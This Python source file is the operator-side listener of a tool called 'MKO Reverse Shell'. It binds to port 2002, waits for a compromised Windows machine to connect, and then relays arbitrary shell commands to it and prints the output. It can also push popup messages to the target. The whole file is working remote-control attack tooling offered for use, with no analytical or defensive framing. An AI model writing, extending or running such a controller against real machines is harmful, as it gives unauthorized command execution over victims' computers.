import socket
import subprocess
import requests
from rich import print as RichPrint

ServerPort = 2002
LocalCommands = ['clear', 'help', 'message']

def DisplayBanner():
    RichPrint("[bold cyan]MKO Reverse Shell[/bold cyan] - https://github.com/snippetcarried\n")

def ClearScreen():
    subprocess.run('cls', shell=True)

def DisplayHelp():
    RichPrint("""
[bold cyan]AVAILABLE COMMANDS:[/bold cyan]
[bold]Local Commands:[/bold]
  - [yellow]message <text>[/yellow]  : Show popup message on target
  - [yellow]clear[/yellow]           : Clear screen
  - [yellow]help[/yellow]            : Show this help message
  - [yellow]exit[/yellow]            : Disconnect

[bold]Remote Commands:[/bold]
  - Any Windows shell command (cmd, powershell, etc.)
  - Examples: [yellow]whoami[/yellow], [yellow]systeminfo[/yellow], [yellow]tasklist[/yellow]
    """)

def HandleLocalCommand(Command, ClientIP, FullInput=''):
    if Command == 'help':
        DisplayHelp()
        return True
    elif Command == 'clear':
        ClearScreen()
        DisplayBanner()
        return True
    elif Command == 'message':
        Message = FullInput[8:].strip()
        RichPrint(f"[bold green]Message: {Message}[/bold green]")
        return True
    return False

def RunServer():
    with socket.socket() as ServerSocket:
        try:
            ServerSocket.bind(('0.0.0.0', ServerPort))
            ServerSocket.listen()
            RichPrint(f"[bold green][+] Server listening on port {ServerPort}[/bold green]")

            Connection, ClientAddress = ServerSocket.accept()
            ClientIP = ClientAddress[0]
            RichPrint(f"[bold green][+] Connected to: {ClientIP}[/bold green]")

            with Connection:
                while True:
                    try:
                        ClearScreen()
                        DisplayBanner()
                        RichPrint(f"[bold cyan]Connected to: {ClientIP}[/bold cyan]")
                        RichPrint(f"[bold cyan]Type 'help' for available commands[/bold cyan]\n")

                        UserCommand = input("[+] Command >> ").strip()

                        if not UserCommand:
                            continue

                        if UserCommand.lower() == 'exit':
                            RichPrint("[+] Disconnecting...")
                            break

                        FirstWord = UserCommand.lower().split()[0]

                        if FirstWord in LocalCommands:
                            HandleLocalCommand(FirstWord, ClientIP, UserCommand)
                            if FirstWord == 'message':
                                Message = UserCommand[8:].strip()
                                if Message:
                                    Connection.send(f'!message:{Message}'.encode())
                                else:
                                    RichPrint("[bold red]Usage: message <text>[/bold red]")
                            input("\n[+] Press Enter to continue...")
                            continue

                        Connection.send(UserCommand.encode())
                        Response = Connection.recv(4096).decode()

                        RichPrint(f"[bold green]Response:[/bold green]\n{Response}")
                        input("\n[+] Press Enter to continue...")

                    except socket.error as Error:
                        RichPrint(f"[bold red][-] Connection error: {Error}[/bold red]")
                        break
                    except KeyboardInterrupt:
                        RichPrint("\n[+] Disconnecting...")
                        break

        except KeyboardInterrupt:
            RichPrint("\n[+] Server stopped")
        except OSError as Error:
            RichPrint(f"[bold red][-] Server error: {Error}[/bold red]")

if __name__ == "__main__":
    RunServer()
